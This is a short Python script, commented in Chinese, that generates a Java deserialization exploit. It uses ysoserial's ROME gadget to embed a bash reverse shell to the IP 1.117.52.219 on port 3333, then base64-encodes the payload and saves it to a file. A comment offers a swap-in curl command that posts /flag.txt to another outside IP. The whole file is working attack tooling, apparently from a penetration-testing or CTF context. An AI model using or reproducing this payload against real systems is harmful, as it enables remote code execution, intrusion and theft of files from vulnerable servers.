# 生成攻击代码，此为反弹shell的代码，先将JAVA的序列化在进行base64加密
# 若要拿到获取目标主机的代码，可将payload 替换成 curl -d @/flag.txt http://110.42.178.227:3333
# 运行之后，/Users/chentuo/Public/shentou/payload/rebound_shell_payload.txt即为最终序列
print('now is serial ---bash -i >& /dev/tcp/1.117.52.219/3333 0>&1 --- {payload}'.format(payload=f'''
{__import__("os").popen("java -jar ~/Public/tool/java_serial_序列化漏洞/ysoserial/ysoserial-master-8eb5cbfbf6-1.jar ROME 'bash -i >& /dev/tcp/1.117.52.219/3333 0>&1' > ~/Public/tool/java_serial_序列化漏洞/payload/rebound_shell.bin").read()}
'''), end='')
print('serial is success ,now is encode')
rebound_shell_payload = '{encode}'.format(encode={
    __import__("base64").b64encode(open('/Users/chentuo/Public/tool/java_serial_序列化漏洞/payload/rebound_shell.bin', 'rb').read())})

encode_payload = rebound_shell_payload[3:len(rebound_shell_payload) - 2]  # 投机取巧进行{'b的过滤
with open('/Users/chentuo/Public/tool/java_serial_序列化漏洞/payload/rebound_shell_payload.txt', 'w') as f:
    f.write(encode_payload)
print(encode_payload)

# 反弹shell的java序列化代码生成 -> 未加密的 rebound_shell_payload -> 以及已经加密后的encode_payload
